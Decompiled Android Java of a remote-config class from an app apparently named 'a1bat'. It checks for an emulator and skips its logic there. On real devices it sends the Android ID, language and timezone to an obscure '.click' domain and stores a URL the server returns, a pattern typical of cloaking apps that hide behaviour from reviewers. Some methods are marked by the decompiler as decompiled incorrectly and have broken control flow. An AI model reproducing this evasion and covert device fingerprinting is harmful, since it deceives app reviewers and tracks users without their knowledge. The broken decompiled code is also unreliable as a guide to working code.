package com.app.a1bat.data.repository;

/* compiled from: RemoteConfigRepository.kt */
@kotlin.Metadata(d1 = {"\u0000,\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\u000e\n\u0002\b\u0005\n\u0002\u0010\u0002\n\u0002\b\u0007\b\u0007\u0018\u0000 \u00162\u00020\u0001:\u0001\u0016B\u001d\u0012\f\u0010\u0002\u001a\b\u0012\u0004\u0012\u00020\u00040\u0003\u0012\u0006\u0010\u0005\u001a\u00020\u0006¢\u0006\u0004\b\u0007\u0010\bJ\u0010\u0010\f\u001a\u0004\u0018\u00010\nH\u0096@¢\u0006\u0002\u0010\rJ\b\u0010\u000e\u001a\u00020\nH\u0002J\u0016\u0010\u000f\u001a\u00020\u00102\u0006\u0010\u0011\u001a\u00020\nH\u0096@¢\u0006\u0002\u0010\u0012J\u0010\u0010\u0013\u001a\u0004\u0018\u00010\nH\u0096@¢\u0006\u0002\u0010\rJ\b\u0010\u0014\u001a\u00020\nH\u0002J\b\u0010\u0015\u001a\u00020\nH\u0002R\u0014\u0010\u0002\u001a\b\u0012\u0004\u0012\u00020\u00040\u0003X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082D¢\u0006\u0002\n\u0000R\u000e\u0010\u000b\u001a\u00020\nX\u0082D¢\u0006\u0002\n\u0000¨\u0006\u0017"}, d2 = {"Lcom/app/a1bat/data/repository/RemoteConfigRepositoryImpl;", "Lcom/app/a1bat/data/repository/RemoteConfigRepository;", "dataStore", "Landroidx/datastore/core/DataStore;", "Landroidx/datastore/preferences/core/Preferences;", "context", "Landroid/content/Context;", "<init>", "(Landroidx/datastore/core/DataStore;Landroid/content/Context;)V", "bundle", "", "apiUrl", "fetchUrl", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getDeviceId", "saveUrl", "", com.google.android.gms.common.internal.ImagesContract.URL, "(Ljava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getSavedUrl", "getLanguage", "getTimezone", "Companion", "app_release"}, k = 1, mv = {2, 0, 0}, xi = 48)
/* loaded from: classes3.dex */
public final class RemoteConfigRepositoryImpl implements com.app.a1bat.data.repository.RemoteConfigRepository {
    private final java.lang.String apiUrl;
    private final java.lang.String bundle;
    private final android.content.Context context;
    private final androidx.datastore.core.DataStore<androidx.datastore.preferences.core.Preferences> dataStore;
    private static final com.app.a1bat.data.repository.RemoteConfigRepositoryImpl.Companion Companion = new com.app.a1bat.data.repository.RemoteConfigRepositoryImpl.Companion(null);
    public static final int $stable = 8;
    private static final androidx.datastore.preferences.core.Preferences.Key<java.lang.String> REMOTE_URL_KEY = androidx.datastore.preferences.core.PreferencesKeys.stringKey("remote_url");

    public RemoteConfigRepositoryImpl(androidx.datastore.core.DataStore<androidx.datastore.preferences.core.Preferences> dataStore, android.content.Context context) {
        kotlin.jvm.internal.Intrinsics.checkNotNullParameter(dataStore, "dataStore");
        kotlin.jvm.internal.Intrinsics.checkNotNullParameter(context, "context");
        this.dataStore = dataStore;
        this.context = context;
        this.bundle = "gbcorp.c384.a1bat.app";
        this.apiUrl = "https://qdvofvqlt.click/v1/public/install";
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* compiled from: RemoteConfigRepository.kt */
    @kotlin.Metadata(d1 = {"\u0000\u0018\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\u0010\u000e\n\u0002\b\u0003\b\u0082\u0003\u0018\u00002\u00020\u0001B\t\b\u0002¢\u0006\u0004\b\u0002\u0010\u0003R\u0017\u0010\u0004\u001a\b\u0012\u0004\u0012\u00020\u00060\u0005¢\u0006\b\n\u0000\u001a\u0004\b\u0007\u0010\b¨\u0006\t"}, d2 = {"Lcom/app/a1bat/data/repository/RemoteConfigRepositoryImpl$Companion;", "", "<init>", "()V", "REMOTE_URL_KEY", "Landroidx/datastore/preferences/core/Preferences$Key;", "", "getREMOTE_URL_KEY", "()Landroidx/datastore/preferences/core/Preferences$Key;", "app_release"}, k = 1, mv = {2, 0, 0}, xi = 48)
    static final class Companion {
        public /* synthetic */ Companion(kotlin.jvm.internal.DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }

        public final androidx.datastore.preferences.core.Preferences.Key<java.lang.String> getREMOTE_URL_KEY() {
            return com.app.a1bat.data.repository.RemoteConfigRepositoryImpl.REMOTE_URL_KEY;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:15:0x01cf  */
    /* JADX WARN: Removed duplicated region for block: B:24:0x01fd A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:37:0x01a4  */
    /* JADX WARN: Removed duplicated region for block: B:38:0x0057  */
    /* JADX WARN: Removed duplicated region for block: B:9:0x003c  */
    @Override // com.app.a1bat.data.repository.RemoteConfigRepository
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public java.lang.Object fetchUrl(kotlin.coroutines.Continuation<? super java.lang.String> continuation) {
        com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$fetchUrl$1 remoteConfigRepositoryImpl$fetchUrl$1;
        java.lang.Object obj;
        java.lang.Object coroutine_suspended;
        int i;
        java.lang.String str;
        int i2;
        try {
            if (continuation instanceof com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$fetchUrl$1) {
                remoteConfigRepositoryImpl$fetchUrl$1 = (com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$fetchUrl$1) continuation;
                if ((remoteConfigRepositoryImpl$fetchUrl$1.label & Integer.MIN_VALUE) != 0) {
                    remoteConfigRepositoryImpl$fetchUrl$1.label -= Integer.MIN_VALUE;
                    obj = remoteConfigRepositoryImpl$fetchUrl$1.result;
                    coroutine_suspended = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED();
                    i = remoteConfigRepositoryImpl$fetchUrl$1.label;
                    str = null;
                    if (i != 0) {
                        kotlin.ResultKt.throwOnFailure(obj);
                        boolean isRealDevice = com.app.a1bat.data.repository.DeviceCheck.INSTANCE.isRealDevice(this.context);
                        java.lang.System.out.println((java.lang.Object) ("🔥 DeviceCheck result = " + isRealDevice));
                        if (!isRealDevice) {
                            java.lang.System.out.println((java.lang.Object) "🔴 Emulator detected → skip logic");
                            return null;
                        }
                        java.util.Map mapOf = kotlin.collections.MapsKt.mapOf(kotlin.TuplesKt.to("bundle", this.bundle), kotlin.TuplesKt.to("device", getDeviceId()), kotlin.TuplesKt.to("language", getLanguage()), kotlin.TuplesKt.to("timezone", getTimezone()));
                        java.lang.System.out.println((java.lang.Object) ("🔵 [Install] Sending POST → " + this.apiUrl));
                        java.lang.System.out.println((java.lang.Object) ("🔵 [Install] Body → " + mapOf));
                        io.ktor.client.HttpClient client = com.app.a1bat.network.HttpClientProvider.INSTANCE.getClient();
                        java.lang.String str2 = this.apiUrl;
                        io.ktor.client.request.HttpRequestBuilder httpRequestBuilder = new io.ktor.client.request.HttpRequestBuilder();
                        io.ktor.client.request.HttpRequestKt.url(httpRequestBuilder, str2);
                        io.ktor.http.HttpMessagePropertiesKt.contentType(httpRequestBuilder, io.ktor.http.ContentType.Application.INSTANCE.getJson());
                        if (mapOf == null) {
                            httpRequestBuilder.setBody(io.ktor.http.content.NullBody.INSTANCE);
                            kotlin.reflect.KType typeOf = kotlin.jvm.internal.Reflection.typeOf(java.util.Map.class, kotlin.reflect.KTypeProjection.INSTANCE.invariant(kotlin.jvm.internal.Reflection.typeOf(java.lang.String.class)), kotlin.reflect.KTypeProjection.INSTANCE.invariant(kotlin.jvm.internal.Reflection.typeOf(java.lang.String.class)));
                            httpRequestBuilder.setBodyType(io.ktor.util.reflect.TypeInfoJvmKt.typeInfoImpl(kotlin.reflect.TypesJVMKt.getJavaType(typeOf), kotlin.jvm.internal.Reflection.getOrCreateKotlinClass(java.util.Map.class), typeOf));
                        } else if (mapOf instanceof io.ktor.http.content.OutgoingContent) {
                            httpRequestBuilder.setBody(mapOf);
                            httpRequestBuilder.setBodyType(null);
                        } else {
                            httpRequestBuilder.setBody(mapOf);
                            kotlin.reflect.KType typeOf2 = kotlin.jvm.internal.Reflection.typeOf(java.util.Map.class, kotlin.reflect.KTypeProjection.INSTANCE.invariant(kotlin.jvm.internal.Reflection.typeOf(java.lang.String.class)), kotlin.reflect.KTypeProjection.INSTANCE.invariant(kotlin.jvm.internal.Reflection.typeOf(java.lang.String.class)));
                            httpRequestBuilder.setBodyType(io.ktor.util.reflect.TypeInfoJvmKt.typeInfoImpl(kotlin.reflect.TypesJVMKt.getJavaType(typeOf2), kotlin.jvm.internal.Reflection.getOrCreateKotlinClass(java.util.Map.class), typeOf2));
                        }
                        httpRequestBuilder.setMethod(io.ktor.http.HttpMethod.INSTANCE.getPost());
                        io.ktor.client.statement.HttpStatement httpStatement = new io.ktor.client.statement.HttpStatement(httpRequestBuilder, client);
                        remoteConfigRepositoryImpl$fetchUrl$1.label = 1;
                        obj = httpStatement.execute(remoteConfigRepositoryImpl$fetchUrl$1);
                        if (obj == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                    } else {
                        if (i != 1) {
                            if (i != 2) {
                                throw new java.lang.IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                            }
                            i2 = remoteConfigRepositoryImpl$fetchUrl$1.I$0;
                            kotlin.ResultKt.throwOnFailure(obj);
                            java.lang.String str3 = (java.lang.String) obj;
                            java.lang.System.out.println((java.lang.Object) ("🟣 [Install] HTTP Status = " + i2));
                            java.lang.System.out.println((java.lang.Object) ("🟣 [Install] Raw HTTP body = " + str3));
                            if (i2 == 200) {
                                if (i2 == 403 || i2 == 404) {
                                    java.lang.System.out.println((java.lang.Object) ("🔴 [Install] Server error code = " + i2));
                                    return null;
                                }
                                java.lang.System.out.println((java.lang.Object) ("🔴 [Install] Unexpected status = " + i2));
                                return null;
                            }
                            try {
                                kotlinx.serialization.json.Json.Companion companion = kotlinx.serialization.json.Json.INSTANCE;
                                companion.getSerializersModule();
                                com.app.a1bat.network.InstallResponse installResponse = (com.app.a1bat.network.InstallResponse) companion.decodeFromString(com.app.a1bat.network.InstallResponse.INSTANCE.serializer(), str3);
                                java.lang.System.out.println((java.lang.Object) ("🟢 [Install] Parsed URL = " + installResponse.getUrl()));
                                str = installResponse.getUrl();
                                return str;
                            } catch (java.lang.Exception e) {
                                java.lang.System.out.println((java.lang.Object) ("🔴 [Install] JSON decode error: " + e.getMessage()));
                                return null;
                            }
                        }
                        kotlin.ResultKt.throwOnFailure(obj);
                    }
                    io.ktor.client.statement.HttpResponse httpResponse = (io.ktor.client.statement.HttpResponse) obj;
                    int value = httpResponse.getStatus().getValue();
                    remoteConfigRepositoryImpl$fetchUrl$1.I$0 = value;
                    remoteConfigRepositoryImpl$fetchUrl$1.label = 2;
                    obj = io.ktor.client.statement.HttpResponseKt.bodyAsText$default(httpResponse, null, remoteConfigRepositoryImpl$fetchUrl$1, 1, null);
                    if (obj != coroutine_suspended) {
                        i2 = value;
                        java.lang.String str32 = (java.lang.String) obj;
                        java.lang.System.out.println((java.lang.Object) ("🟣 [Install] HTTP Status = " + i2));
                        java.lang.System.out.println((java.lang.Object) ("🟣 [Install] Raw HTTP body = " + str32));
                        if (i2 == 200) {
                        }
                    }
                    return coroutine_suspended;
                }
            }
            if (i != 0) {
            }
            io.ktor.client.statement.HttpResponse httpResponse2 = (io.ktor.client.statement.HttpResponse) obj;
            int value2 = httpResponse2.getStatus().getValue();
            remoteConfigRepositoryImpl$fetchUrl$1.I$0 = value2;
            remoteConfigRepositoryImpl$fetchUrl$1.label = 2;
            obj = io.ktor.client.statement.HttpResponseKt.bodyAsText$default(httpResponse2, null, remoteConfigRepositoryImpl$fetchUrl$1, 1, null);
            if (obj != coroutine_suspended) {
            }
            return coroutine_suspended;
        } catch (java.lang.Exception e2) {
            java.lang.System.out.println((java.lang.Object) ("🔴 [Install] Network error: " + e2.getMessage()));
            return str;
        }
        remoteConfigRepositoryImpl$fetchUrl$1 = new com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$fetchUrl$1(this, continuation);
        obj = remoteConfigRepositoryImpl$fetchUrl$1.result;
        coroutine_suspended = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED();
        i = remoteConfigRepositoryImpl$fetchUrl$1.label;
        str = null;
    }

    private final java.lang.String getDeviceId() {
        java.lang.String string = android.provider.Settings.Secure.getString(this.context.getContentResolver(), "android_id");
        return string == null ? "" : string;
    }

    @Override // com.app.a1bat.data.repository.RemoteConfigRepository
    public java.lang.Object saveUrl(java.lang.String str, kotlin.coroutines.Continuation<? super kotlin.Unit> continuation) {
        java.lang.System.out.println((java.lang.Object) ("🟡 [RemoteConfig] Saving URL to DataStore → " + str));
        java.lang.Object edit = androidx.datastore.preferences.core.PreferencesKt.edit(this.dataStore, new com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$saveUrl$2(str, null), continuation);
        return edit == kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED() ? edit : kotlin.Unit.INSTANCE;
    }

    /* JADX WARN: Removed duplicated region for block: B:12:0x0051  */
    /* JADX WARN: Removed duplicated region for block: B:21:0x0032  */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0024  */
    @Override // com.app.a1bat.data.repository.RemoteConfigRepository
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public java.lang.Object getSavedUrl(kotlin.coroutines.Continuation<? super java.lang.String> continuation) {
        com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$getSavedUrl$1 remoteConfigRepositoryImpl$getSavedUrl$1;
        int i;
        java.lang.String str;
        if (continuation instanceof com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$getSavedUrl$1) {
            remoteConfigRepositoryImpl$getSavedUrl$1 = (com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$getSavedUrl$1) continuation;
            if ((remoteConfigRepositoryImpl$getSavedUrl$1.label & Integer.MIN_VALUE) != 0) {
                remoteConfigRepositoryImpl$getSavedUrl$1.label -= Integer.MIN_VALUE;
                java.lang.Object obj = remoteConfigRepositoryImpl$getSavedUrl$1.result;
                java.lang.Object coroutine_suspended = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED();
                i = remoteConfigRepositoryImpl$getSavedUrl$1.label;
                if (i != 0) {
                    kotlin.ResultKt.throwOnFailure(obj);
                    kotlinx.coroutines.flow.Flow<androidx.datastore.preferences.core.Preferences> data = this.dataStore.getData();
                    remoteConfigRepositoryImpl$getSavedUrl$1.label = 1;
                    obj = kotlinx.coroutines.flow.FlowKt.first(data, remoteConfigRepositoryImpl$getSavedUrl$1);
                    if (obj == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                } else {
                    if (i != 1) {
                        throw new java.lang.IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    kotlin.ResultKt.throwOnFailure(obj);
                }
                str = (java.lang.String) ((androidx.datastore.preferences.core.Preferences) obj).get(REMOTE_URL_KEY);
                if (str != null) {
                    java.lang.String str2 = str;
                    r0 = kotlin.text.StringsKt.isBlank(str2) ? null : str2;
                }
                java.lang.System.out.println((java.lang.Object) ("🟣 [RemoteConfig] Loaded saved URL → " + r0));
                return r0;
            }
        }
        remoteConfigRepositoryImpl$getSavedUrl$1 = new com.app.a1bat.data.repository.RemoteConfigRepositoryImpl$getSavedUrl$1(this, continuation);
        java.lang.Object obj2 = remoteConfigRepositoryImpl$getSavedUrl$1.result;
        java.lang.Object coroutine_suspended2 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED();
        i = remoteConfigRepositoryImpl$getSavedUrl$1.label;
        if (i != 0) {
        }
        str = (java.lang.String) ((androidx.datastore.preferences.core.Preferences) obj2).get(REMOTE_URL_KEY);
        if (str != null) {
        }
        java.lang.System.out.println((java.lang.Object) ("🟣 [RemoteConfig] Loaded saved URL → " + r0));
        return r0;
    }

    private final java.lang.String getLanguage() {
        java.lang.String languageTag = java.util.Locale.getDefault().toLanguageTag();
        kotlin.jvm.internal.Intrinsics.checkNotNullExpressionValue(languageTag, "toLanguageTag(...)");
        return languageTag;
    }

    private final java.lang.String getTimezone() {
        java.lang.String id = java.util.TimeZone.getDefault().getID();
        kotlin.jvm.internal.Intrinsics.checkNotNullExpressionValue(id, "getID(...)");
        return id;
    }
}
